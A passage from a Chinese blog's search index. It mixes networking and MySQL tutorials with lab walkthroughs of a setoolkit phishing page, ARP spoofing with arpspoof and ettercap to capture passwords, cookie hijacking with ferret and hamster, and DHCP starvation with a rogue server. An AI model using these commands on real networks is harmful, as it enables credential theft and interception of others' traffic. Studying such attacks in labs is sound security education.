class="lozad"><br>目的MAC地址为<code>00:00:00:00:00:00</code>,是因为这是一个广播包。</p><p><strong>ARP工作原理</strong><br>一般网络设备都有一个ARP缓存，用来存放IP地址和MAC地址的关联信息。发送数据之前，首先查找ARP缓存，如果缓存中有IP地址对应的物理地址，那么用此MAC地址封装以太帧发送，如果没有则会广播ARP报文，主机收到ARP报文之后会发送一个ARP回应，这时将这个回应里的MAC地址存放到ARP缓存，然后进行数据的发送，这个缓存的最大时间是20分钟，由于ARP报文不能跨广播域，所以如果目标处于其他网络，那么将数据转发到网关，由网关转发到目标设备。</p><p><strong>ARP代理</strong><br>如果主机要请求的地址主机无法到达，这时在路由器上开启ARP代理，路由器收到主机这样的请求后，会查找自己的路由表，如果存在这个表项，那么路由器将会回应主机，而主机则会误认为路由器就是目标主机从而将报文转发给路由器，路由器再转发报文给真正的目标主机，这样的路由器就成为ARP代理。</p><p><strong>免费ARP</strong><br>主机在开机时要获取IP地址，这时他需要检测自己的IP地址在这个网络中是否是唯一的，以避免地址冲突，这样就会发送一个广播报文，报文中的目的IP就是自己的IP，如果收到回应就说明这个IP地址已经被使用了。<br>作用：当一个设备被分配了地址或者IP地址变更之后，通过免费，ARP检测自己的IP地址是否冲突。</p><p><strong>ARP欺骗</strong>的原理就是通过伪造ARP包将ARP包中的IP地址对应到攻击者的MAC地址，再由攻击者转发这个包去真正的目标地址，这样受害者的所有数据包都会被攻击者截获。</p>]]></content>
      
      
      <categories>
          
          <category> 路由交换 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 路由交换 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>路由交换协议------ICMP</title>
      <link href="/2018/08/16/router01/"/>
      <url>/2018/08/16/router01/</url>
      
        <content type="html"><![CDATA[<h1 id="路由交换协议——ICMP"><a href="#路由交换协议——ICMP" class="headerlink" title="路由交换协议——ICMP"></a>路由交换协议——ICMP</h1><p><strong>ICMP协议</strong><br>ICMP (InternetControl Message Protocol)协议是<code>TCP/IP</code>协议簇的核心协议之一，用来在网络设备之间传递各种差错和控制信息，对于收集各种网络信息、诊断和排除各种网络故障等方面起着至关重要的作用。</p><p>IP数据包格式是这样的：<br><img alt data-src="https://image.3001.net/images/20181123/15429725391758.jpg" class="lozad"></p><p>其中<code>ICMP</code>数据包的部分是这样的：<br><img alt data-src="https://image.3001.net/images/20181123/15429725412099.jpg" class="lozad"></p><p>（1）类型：用一个8位类型字段表示<code>ICMP</code>数据包的类型。</p><ul><li>类型<code>3</code> 终点不可达</li><li>类型<code>5</code> 改变路由</li><li>类型<code>0</code>或<code>8</code> 回显请求或应答</li><li>类型<code>11</code> 超时</li><li>类型<code>12</code> 参数有问题</li><li>类型<code>13</code>或<code>14</code> 时间戳请求或回答</li></ul><p>（2）代码：用来表示指定类型中的一个功能，如果一个类型只有一种功能，那么这个部分是0。</p><ul><li>根据类型部分结合代码部分具体区分类型中的不同情况<br>比如类型为<code>3</code>，代码部分为<code>0</code>是指网络不可达，为<code>1</code>是指主机不可达，为<code>3</code>是指端口不可达。</li></ul><p>（3）校验和：数据包中ICMP上的一个16位校验和。<br><code>ICMP</code>报文的前四个字节都是一样的。</p><ul><li>用于检验<code>ICMP</code>报文</li></ul><p><code>ICMP</code>报文的种类有两种：1.差错报文  2.询问报文。<br>1.差错报文<br><code>ICMP</code>差错报文共有5种。</p><ul><li>终点不可达</li><li>路由重定向</li><li>超时</li><li>参数出错</li><li>源点抑制</li></ul><p>2.询问报文<br><code>ICMP</code>询问报文共有2种。</p><ul><li>回显请求或应答</li><li>时间戳请求或应答</li></ul><p><code>ICMP</code>最常见的应用就是<code>ping</code>。<br><code>ping</code>一个地址就是发送一个回显的请求。<br><code>ping</code>命令还可以铜价添加<code>-s</code>选项来显示时间戳。<br>除了<code>ping</code>之外的典型应用是<code>Tracert</code>。<br><code>Tracert</code>基于报文中的TTL值（生存时间）来逐跳跟踪报文的转发路径，<code>TTL</code>还可以用来防止环路。</p><p>有这样一个拓扑图：<br><img alt data-src="https://image.3001.net/images/20181123/1542972543265.jpg" class="lozad"><br>现在我在路由器<code>R2</code>上<code>ping</code>路由器<code>R1</code>并在<code>R2</code>的<code>Eth0/0/0</code>上开始抓包。<br><img alt data-src="https://image.3001.net/images/20181123/15429725452325.jpg" class="lozad"><br><img alt data-src="https://image.3001.net/images/20181123/15429725471866.jpg" class="lozad"><br>在抓包的内容中可以看到<code>ICMP</code>中的类型、代码和校验和。</p>]]></content>
      
      
      <categories>
          
          <category> 路由交换 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 路由交换 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQL基本简单操作03</title>
      <link href="/2018/07/17/mysql03/"/>
      <url>/2018/07/17/mysql03/</url>
      
        <content type="html"><![CDATA[<h1 id="MySQL基本简单操作"><a href="#MySQL基本简单操作" class="headerlink" title="MySQL基本简单操作"></a>MySQL基本简单操作</h1><p>现在我创建了一个数据表，表的内容如下：</p><pre><code>mysql&gt; select * from gubeiqing_table;+----------+-----+| name     | age |+----------+-----+| gbq      | 21  || zhangsan | 20  || lisi     | 22  |+----------+-----+3 rows in set (0.00 sec)</code></pre><p>我现在需要对这些数据按照年龄进行一个升序排序。</p><pre><code>mysql&gt; select * from gubeiqing_table order by age ASC;+----------+-----+| name     | age |+----------+-----+| zhangsan | 20  || gbq      | 21  || lisi     | 22  |+----------+-----+3 rows in set (0.00 sec)</code></pre><p>可以看到现在的数据库已经按照升序的方式进行排序了。<br><code>order by</code>是用来排序的，<code>ASC</code>是升序排序，<code>DESC</code>是降序排序。</p><p>现在我有一个这样的数据表。</p><pre><code>mysql&gt; select * from gubeiqing_table;+----------+-----+| name     | age |+----------+-----+| gbq      | 21  || zhangsan | 20  || lisi     | 22  || zhangsi  | 21  || lisan    | 22  |+----------+-----+5 rows in set (0.00 sec)</code></pre><p>我想知道这个数据表里有哪些年龄段。</p><pre><code>mysql&gt; select age from gubeiqing_table group by age;+-----+| age |+-----+| 21  || 20  || 22  |+-----+3 rows in set (0.00 sec)</code></pre><p>首先从数据表中查找<code>age</code>字段，接着通过<code>group by</code>将这些年龄分组。<br>还可以统计这些年龄分别有多少人。</p><pre><code>mysql&gt; select age,count(*) from gubeiqing_table group by age;+-----+----------+| age | count(*) |+-----+----------+| 21  |        2 || 20  |        1 || 22  |        2 |+-----+----------+3 rows in set (0.00 sec)</code></pre><p>接着学一下联合查询，使用<code>UNION</code>，<code>UNION</code>用于连接两个以上的<code>SELECT</code>语句的结果组合到一个结果集合中，多个<code>SELECT</code>语句会删除重复的数据。。</p><pre><code>mysql&gt; show tables;+---------------------+| Tables_in_gubeiqing |+---------------------+| gbq                 || gubeiqing_table     |+---------------------+2 rows in set (0.00 sec)mysql&gt; select * from gbq;+------+-----+| name | age |+------+-----+| qaz  | 20  || wsx  | 23  || edc  | 21  |+------+-----+3 rows in set (0.00 sec)mysql&gt; select * from gubeiqing_table;+----------+-----+| name     | age |+----------+-----+| gbq      | 21  || zhangsan | 20  || lisi     | 22  || zhangsi  | 21  || lisan    | 22  |+----------+-----+5 rows in set (0.00 sec)</code></pre><p>我现在想查看两个表</p><pre><code>mysql&gt; select age from gbq    -&gt; union    -&gt; select age from gubeiqing_table;+-----+| age |+-----+| 20  || 23  || 21  || 22  |+-----+4 rows in set (0.00 sec)</code></pre><p>现在看到的是所有的值，但是并不是这个字段所以的值。用<code>UNION</code>看到的是去重之后的所有值，如果不想去重那么要使用<code>UNION ALL</code>。</p><pre><code>mysql&gt; select age from gbq    -&gt; union all    -&gt; select age from gubeiqing_table;+-----+| age |+-----+| 20  || 23  || 21  || 21  || 20  || 22  || 21  || 22  |+-----+8 rows in set (0.00 sec)</code></pre><p>这样就看到了全部的值。<br>各位大佬不介意的话我只想要一点流量。<a href="http://www.gubeiqing.cn/">个人博客</a></p>]]></content>
      
      
      <categories>
          
          <category> MySQL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MySQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件隐藏</title>
      <link href="/2018/07/16/%E6%95%B0%E6%8D%AE%E9%9A%90%E8%97%8F/"/>
      <url>/2018/07/16/%E6%95%B0%E6%8D%AE%E9%9A%90%E8%97%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="将txt文件藏入jpg文件"><a href="#将txt文件藏入jpg文件" class="headerlink" title="将txt文件藏入jpg文件"></a>将txt文件藏入jpg文件</h1><p>首先新建一个txt文本文档，写入内容并保存，再准备一张图片。<br><img alt data-src="https://image.3001.net/images/20181123/1542973474990.jpg" class="lozad"><br>然后将这个文本文档进行压缩。<br><img alt data-src="https://image.3001.net/images/20181123/15429734761052.jpg" class="lozad"><br>接着打开<code>win+r</code>打开运行，再打开cmd窗口，进入图片和压缩文件所在的目录。<br><img alt data-src="https://image.3001.net/images/20181123/15429734777401.jpg" class="lozad"><br>使用<code>copy /b 2.jpg+1.rar 3.jpg</code>命令，将<code>1.rar</code>隐藏到<code>2.jpg</code>中，生成<code>3.jpg</code>图片。<br><img alt data-src="https://image.3001.net/images/20181123/15429734815981.jpg" class="lozad"><br>可以看到刚刚生成了一个3.jpg，右击属性将3.jpg与原图2.jpg进行比较。<br><img alt data-src="https://image.3001.net/images/20181123/15429734799390.jpg" class="lozad"><br>可以看到大小不一样。接着将藏在图片中的文件提取出来，先将<code>3.jpg</code>改成<code>3.rar</code>，然后打开<code>3.rar</code>，就可以看到藏在图片中的txt文本文档了。<br><img alt data-src="https://image.3001.net/images/20181123/15429734835493.jpg" class="lozad"><br>同理也可以隐藏其他类型的文件。</p>]]></content>
      
      
      <categories>
          
          <category> Windows </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>制作一个简单的钓鱼网站</title>
      <link href="/2018/07/16/kali01/"/>
      <url>/2018/07/16/kali01/</url>
      
        <content type="html"><![CDATA[<p>实验环境：一台kali虚拟机（用作制作钓鱼网站），NAT模式上网。<br>一台物理机（就是我的电脑，用作被攻击对象）</p><p>首先在kali上打开要使用的工具<code>setoolkit</code>.<br><img alt data-src="https://image.3001.net/images/20181204/15439377497282.jpg" class="lozad"></p><p>接着有6个选项，选择第一个<code>社会工程攻击</code>.<br>选择<code>社会工程攻击</code>之后接着有11个选项.<br><img alt data-src="https://image.3001.net/images/20181204/15439377755141.jpg" class="lozad"></p><p>选择第二个<code>网站攻击向量</code>.<br>选择完之后有8个选项。<br><img alt data-src="https://image.3001.net/images/20181204/15439377931384.jpg" class="lozad"></p><p>选择第三个<code>凭证收割攻击方法</code>.<br>选择完之后有3个选项。<br><img alt data-src="https://image.3001.net/images/20181204/1543937808395.jpg" class="lozad"><br>第一个选项是使用kali自带的网站模板。<br>第二个选项是选择一个网站进行克隆。<br>第三个方法是允许自已导入网站。</p><p>这里我们选择第1个，使用网站模板。<br><img alt data-src="https://image.3001.net/images/20181204/15439378236917.jpg" class="lozad"><br>接着默认回车就行，默认使用kali的IP地址，即网站接收到的数据都返回到这个IP。</p><p><img alt data-src="https://image.3001.net/images/20181204/15439378404319.jpg" class="lozad"><br>然后就是选择我们要使用的网站模板，这里用第二个<code>Google</code>试一下。</p><p><img alt data-src="https://image.3001.net/images/20181204/15439378542248.jpg" class="lozad"><br>这里的提示默认就行，然后回车。</p><p><img alt data-src="https://image.3001.net/images/20181204/15439378708943.jpg" class="lozad"><br>这样就大功告成，等着别人来访问那个钓鱼网站。<br>接着我去物理机上进行登录（IP为kali的IP）。</p><p><img alt data-src="https://image.3001.net/images/20181204/15439378858248.jpg" class="lozad"></p><p>再回到kali这边，就可以看到我们刚刚登录使用的账号密码。<br><img alt data-src="https://image.3001.net/images/20181204/15439378973653.jpg" class="lozad"></p>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全 </tag>
            
            <tag> kali </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基于内网的会话劫持</title>
      <link href="/2018/07/16/session/"/>
      <url>/2018/07/16/session/</url>
      
        <content type="html"><![CDATA[<h1 id="会话劫持"><a href="#会话劫持" class="headerlink" title="会话劫持"></a>会话劫持</h1><p>环境：一台kali虚拟机（攻击者，IP：192.168.41.140）<br>一台win7虚拟机（用户，IP：192.168.41.129）<br>网关IP：192.168.41.2</p><p><strong>第一步</strong><br>使用<code>nmap</code>扫描局域网内活动的主机，确定攻击目标，这里的<code>192.168.41.129</code>就是要进行劫持的目标。<br><img alt data-src="https://image.3001.net/images/20181123/15429744364367.jpg" class="lozad"></p><p><strong>第二步</strong><br>使用<code>arpspoof</code>命令进行arp欺骗攻击。<br>先打开kali的转发功能，否则用户端不能正常上网。<br><img alt data-src="https://image.3001.net/images/20181123/15429744388596.jpg" class="lozad"><br><img alt data-src="https://image.3001.net/images/20181123/15429744402049.jpg" class="lozad"></p><p><strong>第三步</strong><br>重新打开一个窗口使用<code>tcpdump</code>进行抓包。<br><img alt data-src="https://image.3001.net/images/20181123/1542974442746.jpg" class="lozad"></p><p><strong>第四步</strong><br>这时我在win7上进行一次账号密码的登录。</p><p><strong>第五步</strong><br>在kali上停止抓包，同时停止arp欺骗。<br><img alt data-src="https://image.3001.net/images/20181123/15429744437485.jpg" class="lozad"></p><p><strong>第六步</strong><br>安装<code>ferret</code>用来分析数据。<br>安装步骤：<br><code>dpkg --add-architecture i386</code>.<br><code>apt-get update</code>.<br><code>apt-get install ferret-sidejack:i386</code>.</p><p><img alt data-src="https://image.3001.net/images/20181123/15429744463644.jpg" class="lozad"></p><p>安装完成之后就可以用它来分析刚刚抓取的数据包了。<br><img alt data-src="https://image.3001.net/images/20181123/15429744497358.jpg" class="lozad"><br>分析完成之后会生成一个叫<code>hamster.txt</code>的文档。<br><img alt data-src="https://image.3001.net/images/20181123/15429744513966.jpg" class="lozad"></p><p><strong>第七步</strong><br>使用<code>hamster</code>登录会话，首先打开<code>hamster</code>.<br><img alt data-src="https://image.3001.net/images/20181123/15429744534146.jpg" class="lozad"><br>根据给出的代理配置来配置浏览器。<br><img alt data-src="https://image.3001.net/images/20181123/15429744553165.jpg" class="lozad"><br>接着就是打开浏览器进行访问。<br><img alt data-src="https://image.3001.net/images/20181123/1542974457572.jpg" class="lozad"><br>点击<code>192.168.41.129</code>，就可以在左边的窗口处看到抓取到的cookies.<br><img alt data-src="https://image.3001.net/images/20181123/15429744592385.jpg" class="lozad"><br>点击之后即可使用他人的cookies访问。</p>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全 </tag>
            
            <tag> kali </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基于内网的ARP攻击</title>
      <link href="/2018/07/16/Arp%E6%94%BB%E5%87%BB/"/>
      <url>/2018/07/16/Arp%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<h1 id="内网arp攻击"><a href="#内网arp攻击" class="headerlink" title="内网arp攻击"></a>内网arp攻击</h1><p>环境：一台kali虚拟机（攻击者），一台win7虚拟机（用户）<br>网络：NAT模式<br>网段：192.168.41.0/24<br>网关：192.168.41.2/24<br>win7的IP地址：192.168.41.129/24<br>kali的IP地址：192.168.41.139/24</p><p>首先在kali下用<code>nmap</code>工具扫描找到局域网内的活动主机，确定攻击目标，使用<code>nmap -sn 192.168.41.0/24</code>命令扫描。<br><img alt data-src="https://image.3001.net/images/20181123/15429733313805.jpg" class="lozad"><br>找到win7（192.168.41.129/24），确定了攻击目标之后，在kali下使用<code>arpspoof</code>进行arp欺骗。<br><code>arpspoof</code>命令的格式是<code>arpspoof -i 网卡 -t 目标IP 网关IP</code>.<br>先查看一下网卡的名称：<br><img alt data-src="https://image.3001.net/images/20181123/15429733334002.jpg" class="lozad"><br>所以我的命令是<code>arpspoof -i eth0 -t 192.168.41.129 192.168.41.2</code>.<br><img alt data-src="https://image.3001.net/images/20181123/15429733351059.jpg" class="lozad"><br>开启之后放在一旁，重新打开一个shell窗口，打开kali的转发功能：<br><img alt data-src="https://image.3001.net/images/20181123/15429733372470.jpg" class="lozad"><br>接着再重新打开一个shell窗口，使用ettercap命令抓取win7上使用的账号密码等信息。<br>使用的命令是<code>ettercap -Tq -i eth0</code>.<br><img alt data-src="https://image.3001.net/images/20181123/15429733383565.jpg" class="lozad"><br>这样就启用了<code>ettercap</code>开始抓取win7上使用的账号密码。<br>然后到win7上进行一次账号密码的使用，以我登录路由器为例：<br><img alt data-src="https://image.3001.net/images/20181123/15429733402473.jpg" class="lozad"><br>这样就成功抓到了我登陆路由器时使用的账号密码以及我登录的网址。</p>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全 </tag>
            
            <tag> kali </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基于内网的DHCP攻击</title>
      <link href="/2018/07/16/DHCP/"/>
      <url>/2018/07/16/DHCP/</url>
      
        <content type="html"><![CDATA[<p>#局域网内DHCP攻击</p><p>实验环境：两个win2008 r2虚拟机（一台用作正常的DHCP服务器，另一台用作伪造DHCP服务器），两个win7虚拟机（用作客户机），一个kali虚拟机（用作攻击，耗尽DHCP地址池）<br>拓扑图如下：<br><img alt data-src="https://image.3001.net/images/20181123/15429739082599.jpg" class="lozad"></p><p><strong>第一步先配置正常的DHCP服务器</strong><br><img alt data-src="https://image.3001.net/images/20181123/15429739184351.jpg" class="lozad"><br><img alt data-src="https://image.3001.net/images/20181123/1542973928168.jpg" class="lozad"><br><img alt data-src="https://image.3001.net/images/20181123/15429739405783.jpg" class="lozad"><br><img alt data-src="https://image.3001.net/images/20181123/15429739557967.jpg" class="lozad"><br><img alt data-src="https://image.3001.net/images/20181123/15429739675115.jpg" class="lozad"><br><img alt data-src="https://image.3001.net/images/20181123/15429739771951.jpg" class="lozad"><br><img alt data-src="https://image.3001.net/images/20181123/15429739889762.jpg" class="lozad"><br><img alt data-src="https://image.3001.net/images/20181123/1542974001495.jpg" class="lozad"><br><img alt data-src="https://image.3001.net/images/20181123/15429740174248.jpg" class="lozad"><br>这里要勾选激活作用域，默认网关就填正常可用的网关。<br><img alt data-src="https://image.3001.net/images/20181123/15429740383813.jpg" class="lozad"><br><img alt data-src="https://image.3001.net/images/20181123/15429740495330.jpg" class="lozad"><br><img alt data-src="https://image.3001.net/images/20181123/15429740634817.jpg" class="lozad"><br><img alt data-src="https://image.3001.net/images/20181123/15429740666505.jpg" class="lozad"></p><p><strong>第二步配置伪造DHCP服务器</strong><br><img alt data-src="https://image.3001.net/images/20181123/154297406836.jpg" class="lozad"><br>这里与正常DHCP服务器不同的是先不激活作用域，网关填写攻击者的IP地址。</p><p><strong>第三步在win7客户机上使用DHCP获取IP地址</strong><br><img alt data-src="https://image.3001.net/images/20181123/15429741219128.jpg" class="lozad"><br>可以看到正常获取到IP地址，再到DHCP服务器上查看DHCP地址池，看到有一个地址已经租用。<br><img alt data-src="https://image.3001.net/images/20181123/15429741231252.jpg" class="lozad"></p><p><strong>第四步在kali上使用<code>pig.py eth0</code>将正常DHCP服务器的地址耗尽</strong><br><img alt data-src="https://image.3001.net/images/20181123/15429741257392.jpg" class="lozad"><br><img alt data-src="https://image.3001.net/images/20181123/15429741276823.jpg" class="lozad"><br>可以看到kali已经将DHCP地址池里的地址耗尽，再到DHCP服务器看一下，发现所有地址都已经被租用。<br><img alt data-src="https://image.3001.net/images/20181123/15429741295200.jpg" class="lozad"></p><p><strong>第五步到伪造的DHCP服务器，激活作用域</strong><br><img alt data-src="https://image.3001.net/images/20181123/15429742074347.jpg" class="lozad"><br>查看地址租用<br><img alt data-src="https://image.3001.net/images/20181123/15429742105823.jpg" class="lozad"><br>现在还没用租用IP地址，然后开启一台win7虚拟机，再查看伪造DHCP服务器的地址池。<br><img alt data-src="https://image.3001.net/images/20181123/15429742129842.jpg" class="lozad"><br>可以看到已经分发了一个IP地址。</p><p><strong>第六步去kali上打开转发功能并配置网关</strong><br>这样就使得win7的流量会首先经过攻击者kali然后再转发去网关。<br><img alt data-src="https://image.3001.net/images/20181123/15429742139945.jpg" class="lozad"></p><p><strong>第七步在攻击者PC上打开抓包工具</strong><br>这样win7的所有流量都会被攻击者抓到（这里使用的抓包工具是wireshark）<br><img alt data-src="https://image.3001.net/images/20181123/15429742157482.jpg" class="lozad"><br>还可以配置过滤器抓取去往某个IP地址的流量<br><img alt data-src="https://image.3001.net/images/20181123/15429742177187.jpg" class="lozad"></p>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全 </tag>
            
            <tag> kali </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQL基本简单操作02</title>
      <link href="/2018/07/16/mysql02/"/>
      <url>/2018/07/16/mysql02/</url>
      
        <content type="html"><![CDATA[<h1 id="MySQL基本简单操作"><a href="#MySQL基本简单操作" class="headerlink" title="MySQL基本简单操作"></a>MySQL基本简单操作</h1><p>先进入<code>Mysql</code>容器。</p><pre><code>[root@promote ~]# docker exec -it mysql /bin/bashroot@30d60b852cf5:/# mysql -uroot -p000000mysql: [Warning] Using a password on the command line interface can be insecure.Welcome to the MySQL monitor.  Commands end with ; or \g.Your MySQL connection id is 8Server version: 8.0.11 MySQL Community Server - GPLCopyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners.Type &apos;help;&apos; or &apos;\h&apos; for help. Type &apos;\c&apos; to clear the current input statement.mysql&gt;</code></pre><p>新建一个数据库。</p><pre><code>mysql&gt; create database gubeiqing;Query OK, 1 row affected (0.02 sec)mysql&gt; show databases;+--------------------+| Database           |+--------------------+| gubeiqing          || information_schema || mysql              || performance_schema || sys                |+--------------------+5 rows in set (0.01 sec)</code></pre><p>进入数据库，新建数据表。</p><pre><code>mysql&gt; use gubeiqing;Database changedmysql&gt; show tables;Empty set (0.00 sec)mysql&gt; create table gubeiqing_table(name varchar(20) not null , age varchar(20) not null);Query OK, 0 rows affected (0.11 sec)mysql&gt; show tables;+---------------------+| Tables_in_gubeiqing |+---------------------+| gubeiqing_table     |+---------------------+1 row in set (0.01 sec)</code></pre><p>接着给数据库新增列，基本简单语法是：<code>ALTER TABLE 表名 add column 列名 列类型 是否为空;</code>。</p><pre><code>mysql&gt; desc gubeiqing_table;+-------+-------------+------+-----+---------+-------+| Field | Type        | Null | Key | Default | Extra |+-------+-------------+------+-----+---------+-------+| name  | varchar(20) | NO   |     | NULL    |       || age   | varchar(20) | NO   |     | NULL    |       |+-------+-------------+------+-----+---------+-------+2 rows in set (0.01 sec)mysql&gt; alter table gubeiqing_table add column job varchar(20) not null;Query OK, 0 rows affected (0.26 sec)Records: 0  Duplicates: 0  Warnings: 0mysql&gt; desc gubeiqing_table;+-------+-------------+------+-----+---------+-------+| Field | Type        | Null | Key | Default | Extra |+-------+-------------+------+-----+---------+-------+| name  | varchar(20) | NO   |     | NULL    |       || age   | varchar(20) | NO   |     | NULL    |       || job   | varchar(20) | NO   |     | NULL    |       |+-------+-------------+------+-----+---------+-------+3 rows in set (0.00 sec)</code></pre><p>修改列名，基本简单语法是：<code>ALTER TABLE 表名 change column 原列名 修改后的列名 列类型 是否为空；</code>。</p><pre><code>mysql&gt; desc gubeiqing_table;+-------+-------------+------+-----+---------+-------+| Field | Type        | Null | Key | Default | Extra |+-------+-------------+------+-----+---------+-------+| name  | varchar(20) | NO   |     | NULL    |       || age   | varchar(20) | NO   |     | NULL    |       || job   | varchar(20) | NO   |     | NULL    |       |+-------+-------------+------+-----+---------+-------+3 rows in set (0.00 sec)mysql&gt; alter table gubeiqing_table change column job gbq_job varchar(20) not null;Query OK, 0 rows affected (0.11 sec)Records: 0  Duplicates: 0  Warnings: 0mysql&gt; desc gubeiqing_table;+---------+-------------+------+-----+---------+-------+| Field   | Type        | Null | Key | Default | Extra |+---------+-------------+------+-----+---------+-------+| name    | varchar(20) | NO   |     | NULL    |       || age     | varchar(20) | NO   |     | NULL    |       || gbq_job | varchar(20) | NO   |     | NULL    |       |+---------+-------------+------+-----+---------+-------+3 rows in set (0.00 sec)</code></pre><p>删除刚刚新增的列，基本简单语法是：<code>ALTER TABLE 表名 drop column 列名;</code>。</p><pre><code>mysql&gt; desc gubeiqing_table;+---------+-------------+------+-----+---------+-------+| Field   | Type        | Null | Key | Default | Extra |+---------+-------------+------+-----+---------+-------+| name    | varchar(20) | NO   |     | NULL    |       || age     | varchar(20) | NO   |     | NULL    |       || gbq_job | varchar(20) | NO   |     | NULL    |       |+---------+-------------+------+-----+---------+-------+3 rows in set (0.00 sec)mysql&gt; alter table gubeiqing_table drop column gbq_job;Query OK, 0 rows affected (0.11 sec)Records: 0  Duplicates: 0  Warnings: 0mysql&gt; desc gubeiqing_table;+-------+-------------+------+-----+---------+-------+| Field | Type        | Null | Key | Default | Extra |+-------+-------------+------+-----+---------+-------+| name  | varchar(20) | NO   |     | NULL    |       || age   | varchar(20) | NO   |     | NULL    |       |+-------+-------------+------+-----+---------+-------+2 rows in set (0.00 sec)</code></pre><p>然后说一下模糊搜索，就比如现在要在数据库里查找<code>zhangsan</code>的信息，可是只记得<code>zhang</code>剩下的部分都不记得了，那么就可以使用模糊搜索，基本简单语法是：<code>SELECT * from 表名  WHERE 字段 LIKE &#39;模糊字段&#39;;</code>。</p><pre><code>mysql&gt; select * from gubeiqing_table where name like &apos;zhang%&apos;;+----------+-----+| name     | age |+----------+-----+| zhangsan | 20  |+----------+-----+1 row in set (0.01 sec)</code></pre><p><code>%</code>用来表示不记得的部分，是通配符。<br>除了<code>%</code>之外还有 <code>_</code>表示任何单个字符，<code>[ ]</code>指定范围或集合中的任何单个字符，<code>[^]</code>不属于指定范围或集合的任何单个字符。</p>]]></content>
      
      
      <categories>
          
          <category> MySQL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MySQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQL基本简单操作01</title>
      <link href="/2018/07/16/mysql01/"/>
      <url>/2018/07/16/mysql01/</url>
      
        <content type="html"><![CDATA[<h1 id="MySQL基本简单操作"><a href="#MySQL基本简单操作" class="headerlink" title="MySQL基本简单操作"></a>MySQL基本简单操作</h1><p>学会了安装<code>Docker</code>，那么就将它利用起来。（/滑稽脸）<br>之前想学习<code>Mysql</code>（Windows下配置真麻烦），学会了<code>Docker</code>就方便了，直接使用<code>Docker</code>创建一个<code>Mysql</code>服务岂不美滋滋。创建容器的步骤可以看一下分享04的<code>Nginx</code>的创建过程。<br>首先检查一下本地镜像。</p><pre><code>[root@promote ~]# docker imagesREPOSITORY          TAG                 IMAGE ID            CREATED             SIZE</code></pre><p>没有<code>Mysql</code>的镜像，那么我先来拉取一个<code>Mysql</code>镜像。<br>先搜索一下<code>Mysql</code>的镜像。</p><pre><code>[root@promote ~]# docker search mysqlINDEX       NAME                                                             DESCRIPTION                                     STARS     OFFICIAL   AUTOMATEDdocker.io   docker.io/mysql                                                  MySQL is a widely used, open-source relati...   6527      [OK]docker.io   docker.io/mariadb                                                MariaDB is a community-developed fork of M...   2061      [OK]docker.io   docker.io/mysql/mysql-server                                     Optimized MySQL Server Docker images. Crea...   479                  [OK]docker.io   docker.io/percona                                                Percona Server is a fork of the MySQL rela...   344       [OK]docker.io   docker.io/zabbix/zabbix-server-mysql                             Zabbix Server with MySQL database support       106                  [OK]docker.io   docker.io/hypriot/rpi-mysql                                      RPi-compatible Docker Image with Mysql          89docker.io   docker.io/centurylink/mysql                                      Image containing mysql. Optimized to be li...   60                   [OK]docker.io   docker.io/zabbix/zabbix-web-nginx-mysql                          Zabbix frontend based on Nginx web-server ...   58                   [OK]docker.io   docker.io/1and1internet/ubuntu-16-nginx-php-phpmyadmin-mysql-5   ubuntu-16-nginx-php-phpmyadmin-mysql-5          36                   [OK]docker.io   docker.io/tutum/mysql                                            Base docker image to run a MySQL database ...   32docker.io   docker.io/centos/mysql-57-centos7                                MySQL 5.7 SQL database server                   31docker.io   docker.io/mysql/mysql-cluster                                    Experimental MySQL Cluster Docker images. ...   30docker.io   docker.io/schickling/mysql-backup-s3                             Backup MySQL to S3 (supports periodic back...   20                   [OK]docker.io   docker.io/bitnami/mysql                                          Bitnami MySQL Docker Image                      15                   [OK]docker.io   docker.io/zabbix/zabbix-proxy-mysql                              Zabbix proxy with MySQL database support        15                   [OK]docker.io   docker.io/linuxserver/mysql                                      A Mysql container, brought to you by Linux...   14docker.io   docker.io/centos/mysql-56-centos7                                MySQL 5.6 SQL database server                   8docker.io   docker.io/openshift/mysql-55-centos7                             DEPRECATED: A Centos7 based MySQL v5.5 ima...   6docker.io   docker.io/circleci/mysql                                         MySQL is a widely used, open-source relati...   5docker.io   docker.io/dsteinkopf/backup-all-mysql                            backup all DBs in a mysql server                4                    [OK]docker.io   docker.io/mysql/mysql-router                                     MySQL Router provides transparent routing ...   2docker.io   docker.io/openzipkin/zipkin-mysql                                Mirror of https://quay.io/repository/openz...   1docker.io   docker.io/ansibleplaybookbundle/mysql-apb                        An APB which deploys RHSCL MySQL                0                    [OK]docker.io   docker.io/cloudfoundry/cf-mysql-ci                               Image used in CI of cf-mysql-release            0docker.io   docker.io/cloudposse/mysql                                       Improved `mysql` service with support for ...   0                    [OK]</code></pre><p>接着拉取镜像到本地，当然是优先官方镜像。</p><pre><code>[root@promote ~]# docker pull docker.io/mysqlUsing default tag: latestTrying to pull repository docker.io/library/mysql ...latest: Pulling from docker.io/library/mysql683abbb4ea60: Pull complete0550d17aeefa: Pull complete7e26605ddd77: Pull complete9882737bd15f: Pull 